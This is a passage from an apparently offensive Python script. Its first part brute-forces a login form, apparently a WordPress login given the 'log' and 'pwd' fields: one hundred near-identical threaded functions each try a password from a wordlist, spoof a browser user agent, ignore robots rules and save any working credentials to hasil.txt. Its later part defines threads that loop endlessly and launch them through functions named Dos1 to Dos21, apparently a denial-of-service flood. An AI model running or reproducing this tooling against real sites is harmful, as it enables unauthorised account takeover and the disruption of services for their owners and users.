        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x84():
    w1=k84.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x85():
    w1=k85.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x86():
    w1=k86.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x87():
    w1=k87.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x88():
    w1=k88.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x89():
    w1=k89.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x90():
    w1=k90.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x91():
    w1=k91.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x92():
    w1=k92.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x93():
    w1=k93.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x94():
    w1=k94.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x95():
    w1=k95.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x96():
    w1=k96.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x97():
    w1=k97.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x98():
    w1=k98.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x99():
    w1=k99.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()
def x100():
    w1=k100.readline().strip()
    br1 = mechanize.Browser()
    url = inurl
    global oskhar
    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()

th1=threading.Thread(target=x1)
th2=threading.Thread(target=x2)
th3=threading.Thread(target=x3)
th4=threading.Thread(target=x4)
th5=threading.Thread(target=x5)
th6=threading.Thread(target=x6)
th7=threading.Thread(target=x7)
th8=threading.Thread(target=x8)
th9=threading.Thread(target=x9)
th10=threading.Thread(target=x10)
th11=threading.Thread(target=x11)
th12=threading.Thread(target=x12)
th13=threading.Thread(target=x13)
th14=threading.Thread(target=x14)
th15=threading.Thread(target=x15)
th16=threading.Thread(target=x16)
th17=threading.Thread(target=x17)
th18=threading.Thread(target=x18)
th19=threading.Thread(target=x19)
th20=threading.Thread(target=x20)
th21=threading.Thread(target=x21)
th22=threading.Thread(target=x22)
th23=threading.Thread(target=x23)
th24=threading.Thread(target=x24)
th25=threading.Thread(target=x25)
th26=threading.Thread(target=x26)
th27=threading.Thread(target=x27)
th28=threading.Thread(target=x28)
th29=threading.Thread(target=x29)
th30=threading.Thread(target=x30)
th31=threading.Thread(target=x31)
th32=threading.Thread(target=x32)
th33=threading.Thread(target=x33)
th34=threading.Thread(target=x34)
th35=threading.Thread(target=x35)
th36=threading.Thread(target=x36)
th37=threading.Thread(target=x37)
th38=threading.Thread(target=x38)
th39=threading.Thread(target=x39)
th40=threading.Thread(target=x40)
th41=threading.Thread(target=x41)
th42=threading.Thread(target=x42)
th43=threading.Thread(target=x43)
th44=threading.Thread(target=x44)
th45=threading.Thread(target=x45)
th46=threading.Thread(target=x46)
th47=threading.Thread(target=x47)
th48=threading.Thread(target=x48)
th49=threading.Thread(target=x49)
th50=threading.Thread(target=x50)
th51=threading.Thread(target=x51)
th52=threading.Thread(target=x52)
th53=threading.Thread(target=x53)
th54=threading.Thread(target=x54)
th55=threading.Thread(target=x55)
th56=threading.Thread(target=x56)
th57=threading.Thread(target=x57)
th58=threading.Thread(target=x58)
th59=threading.Thread(target=x59)
th60=threading.Thread(target=x60)
th61=threading.Thread(target=x61)
th62=threading.Thread(target=x62)
th63=threading.Thread(target=x63)
th64=threading.Thread(target=x64)
th65=threading.Thread(target=x65)
th66=threading.Thread(target=x66)
th67=threading.Thread(target=x67)
th68=threading.Thread(target=x68)
th69=threading.Thread(target=x69)
th70=threading.Thread(target=x70)
th71=threading.Thread(target=x71)
th72=threading.Thread(target=x72)
th73=threading.Thread(target=x73)
th74=threading.Thread(target=x74)
th75=threading.Thread(target=x75)
th76=threading.Thread(target=x76)
th77=threading.Thread(target=x77)
th78=threading.Thread(target=x78)
th79=threading.Thread(target=x79)
th80=threading.Thread(target=x80)
th81=threading.Thread(target=x81)
th82=threading.Thread(target=x82)
th83=threading.Thread(target=x83)
th84=threading.Thread(target=x84)
th85=threading.Thread(target=x85)
th86=threading.Thread(target=x86)
th87=threading.Thread(target=x87)
th88=threading.Thread(target=x88)
th89=threading.Thread(target=x89)
th90=threading.Thread(target=x90)
th91=threading.Thread(target=x91)
th92=threading.Thread(target=x92)
th93=threading.Thread(target=x93)
th94=threading.Thread(target=x94)
th95=threading.Thread(target=x95)
th96=threading.Thread(target=x96)
th97=threading.Thread(target=x97)
th98=threading.Thread(target=x98)
th99=threading.Thread(target=x99)
th100=threading.Thread(target=x100)


def start1():
    th1.start();th2.start();th3.start();th4.start();th5.start();th6.start();th7.start();th8.start();th9.start();th10.start()


def start2():
    th1.start();th2.start();th3.start();th4.start();th5.start();th6.start();th7.start();th8.start();th9.start();th10.start();th11.start();th12.start();th13.start();th14.start();th15.start();th16.start();th17.start();th18.start();th19.start();th20.start();th21.start();th22.start();th23.start();th24.start();th25.start();th26.start();th27.start();th28.start();th29.start();th30.start();th31.start();th32.start();th33.start();th34.start();th35.start();th36.start();th37.start();th38.start();th39.start();th40.start();th41.start();th42.start();th43.start();th44.start();th45.start();th46.start();th47.start();th48.start();th49.start();th50.start();th51.start();th52.start();th53.start();th54.start();th55.start();th56.start();th57.start();th58.start();th59.start();th60.start();th61.start();th62.start();th63.start();th64.start();th65.start();th66.start();th67.start();th68.start();th69.start();th70.start();th71.start();th72.start();th73.start();th74.start();th75.start();th76.start();th77.start();th78.start();th79.start();th80.start();th81.start();th82.start();th83.start();th84.start();th85.start();th86.start();th87.start();th88.start();th89.start();th90.start();th91.start();th92.start();th93.start();th94.start();th95.start();th96.start();th97.start();th98.start();th99.start();th100.start();


def t1():
    while True:
        os1()
def t2():
    while True:
        os2()
def t3():
    while True:
        os3()
def t4():
    while True:
        os4()
def t5():
    while True:
        os5()
def t6():
    while True:
        os6()
def t7():
    while True:
        os7()
def t8():
    while True:
        os8()
def t9():
    while True:
        os9()
def t10():
    while True:
        os10()
def t11():
    while True:
        os11()
def t12():
    while True:
        os12()
def t13():
    while True:
        os13()
def t14():
    while True:
        os14()
def t15():
    while True:
        os15()
def t16():
    while True:
        os16()
def t17():
    while True:
        os17()
def t18():
    while True:
        os18()
def t19():
    while True:
        os19()
def t20():
    while True:
        os20()
def t21():
    while True:
        os21()
def t22():
    while True:
        os22()
def t23():
    while True:
        os23()
def t24():
    while True:
        os24()
def t25():
    while True:
        os25()
def t26():
    while True:
        os26()
def t27():
    while True:
        os27()
def t28():
    while True:
        os28()
def t29():
    while True:
        os29()
def t30():
    while True:
        os30()
def t31():
    while True:
        os31()
def t32():
    while True:
        os32()
def t33():
    while True:
        os33()
def t34():
    while True:
        os34()
def t35():
    while True:
        os35()
def t36():
    while True:
        os36()
def t37():
    while True:
        os37()
def t38():
    while True:
        os38()
def t39():
    while True:
        os39()
def t40():
    while True:
        os40()
def t41():
    while True:
        os41()
def t42():
    while True:
        os42()
def t43():
    while True:
        os43()
def t44():
    while True:
        os44()
def t45():
    while True:
        os45()
def t46():
    while True:
        os46()
def t47():
    while True:
        os47()
def t48():
    while True:
        os48()
def t49():
    while True:
        os49()
def t50():
    while True:
        os50()
def t51():
    while True:
        os51()
def t52():
    while True:
        os52()
def t53():
    while True:
        os53()
def t54():
    while True:
        os54()
def t55():
    while True:
        os55()
def t56():
    while True:
        os56()
def t57():
    while True:
        os57()
def t58():
    while True:
        os58()
def t59():
    while True:
        os59()
def t60():
    while True:
        os60()
def t61():
    while True:
        os61()
def t62():
    while True:
        os62()
def t63():
    while True:
        os63()
def t64():
    while True:
        os64()
def t65():
    while True:
        os65()
def t66():
    while True:
        os66()
def t67():
    while True:
        os67()
def t68():
    while True:
        os68()
def t69():
    while True:
        os69()
def t70():
    while True:
        os70()
def t71():
    while True:
        os71()
def t72():
    while True:
        os72()
def t73():
    while True:
        os73()
def t74():
    while True:
        os74()
def t75():
    while True:
        os75()
def t76():
    while True:
        os76()
def t77():
    while True:
        os77()
def t78():
    while True:
        os78()
def t79():
    while True:
        os79()
def t80():
    while True:
        os80()
def t81():
    while True:
        os81()
def t82():
    while True:
        os82()
def t83():
    while True:
        os83()
def t84():
    while True:
        os84()
def t85():
    while True:
        os85()
def t86():
    while True:
        os86()
def t87():
    while True:
        os87()
def t88():
    while True:
        os88()
def t89():
    while True:
        os89()
def t90():
    while True:
        os90()
def t91():
    while True:
        os91()
def t92():
    while True:
        os92()
def t93():
    while True:
        os93()
def t94():
    while True:
        os94()
def t95():
    while True:
        os95()
def t96():
    while True:
        os96()
def t97():
    while True:
        os97()
def t98():
    while True:
        os98()
def t99():
    while True:
        os99()
def t100():
    while True:
        os100()


tth1=threading.Thread(target=t1)
tth2=threading.Thread(target=t2)
tth3=threading.Thread(target=t3)
tth4=threading.Thread(target=t4)
tth5=threading.Thread(target=t5)
tth6=threading.Thread(target=t6)
tth7=threading.Thread(target=t7)
tth8=threading.Thread(target=t8)
tth9=threading.Thread(target=t9)
tth10=threading.Thread(target=t10)
tth11=threading.Thread(target=t11)
tth12=threading.Thread(target=t12)
tth13=threading.Thread(target=t13)
tth14=threading.Thread(target=t14)
tth15=threading.Thread(target=t15)
tth16=threading.Thread(target=t16)
tth17=threading.Thread(target=t17)
tth18=threading.Thread(target=t18)
tth19=threading.Thread(target=t19)
tth20=threading.Thread(target=t20)
tth21=threading.Thread(target=t21)
tth22=threading.Thread(target=t22)
tth23=threading.Thread(target=t23)
tth24=threading.Thread(target=t24)
tth25=threading.Thread(target=t25)
tth26=threading.Thread(target=t26)
tth27=threading.Thread(target=t27)
tth28=threading.Thread(target=t28)
tth29=threading.Thread(target=t29)
tth30=threading.Thread(target=t30)
tth31=threading.Thread(target=t31)
tth32=threading.Thread(target=t32)
tth33=threading.Thread(target=t33)
tth34=threading.Thread(target=t34)
tth35=threading.Thread(target=t35)
tth36=threading.Thread(target=t36)
tth37=threading.Thread(target=t37)
tth38=threading.Thread(target=t38)
tth39=threading.Thread(target=t39)
tth40=threading.Thread(target=t40)
tth41=threading.Thread(target=t41)
tth42=threading.Thread(target=t42)
tth43=threading.Thread(target=t43)
tth44=threading.Thread(target=t44)
tth45=threading.Thread(target=t45)
tth46=threading.Thread(target=t46)
tth47=threading.Thread(target=t47)
tth48=threading.Thread(target=t48)
tth49=threading.Thread(target=t49)
tth50=threading.Thread(target=t50)
tth51=threading.Thread(target=t51)
tth52=threading.Thread(target=t52)
tth53=threading.Thread(target=t53)
tth54=threading.Thread(target=t54)
tth55=threading.Thread(target=t55)
tth56=threading.Thread(target=t56)
tth57=threading.Thread(target=t57)
tth58=threading.Thread(target=t58)
tth59=threading.Thread(target=t59)
tth60=threading.Thread(target=t60)
tth61=threading.Thread(target=t61)
tth62=threading.Thread(target=t62)
tth63=threading.Thread(target=t63)
tth64=threading.Thread(target=t64)
tth65=threading.Thread(target=t65)
tth66=threading.Thread(target=t66)
tth67=threading.Thread(target=t67)
tth68=threading.Thread(target=t68)
tth69=threading.Thread(target=t69)
tth70=threading.Thread(target=t70)
tth71=threading.Thread(target=t71)
tth72=threading.Thread(target=t72)
tth73=threading.Thread(target=t73)
tth74=threading.Thread(target=t74)
tth75=threading.Thread(target=t75)
tth76=threading.Thread(target=t76)
tth77=threading.Thread(target=t77)
tth78=threading.Thread(target=t78)
tth79=threading.Thread(target=t79)
tth80=threading.Thread(target=t80)
tth81=threading.Thread(target=t81)
tth82=threading.Thread(target=t82)
tth83=threading.Thread(target=t83)
tth84=threading.Thread(target=t84)
tth85=threading.Thread(target=t85)
tth86=threading.Thread(target=t86)
tth87=threading.Thread(target=t87)
tth88=threading.Thread(target=t88)
tth89=threading.Thread(target=t89)
tth90=threading.Thread(target=t90)
tth91=threading.Thread(target=t91)
tth92=threading.Thread(target=t92)
tth93=threading.Thread(target=t93)
tth94=threading.Thread(target=t94)
tth95=threading.Thread(target=t95)
tth96=threading.Thread(target=t96)
tth97=threading.Thread(target=t97)
tth98=threading.Thread(target=t98)
tth99=threading.Thread(target=t99)
tth100=threading.Thread(target=t100)

def Dos1():
    tth1.start()
def Dos2():
    tth1.start()
    tth2.start()
def Dos3():
    tth1.start()
    tth2.start()
    tth3.start()
def Dos4():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
def Dos5():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
def Dos6():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
def Dos7():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
def Dos8():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
def Dos9():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
def Dos10():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
def Dos11():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
def Dos12():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
def Dos13():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
def Dos14():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
def Dos15():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
def Dos16():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
def Dos17():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
def Dos18():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
def Dos19():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
def Dos20():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
def Dos21():
    tth1.start()
    tth2.start()
    tth3.start()
    tth4.start()
    tth5.start()
    tth6.start()
    tth7.start()
    tth8.start()
    tth9.start()
    tth10.start()
    tth11.start()
    tth12.start()
    tth13.start()
    tth14.start()
    tth15.start()
    tth16.start()
    tth17.start()
    tth18.start()
    tth19.start()
    tth20.start()
    tth21.start()
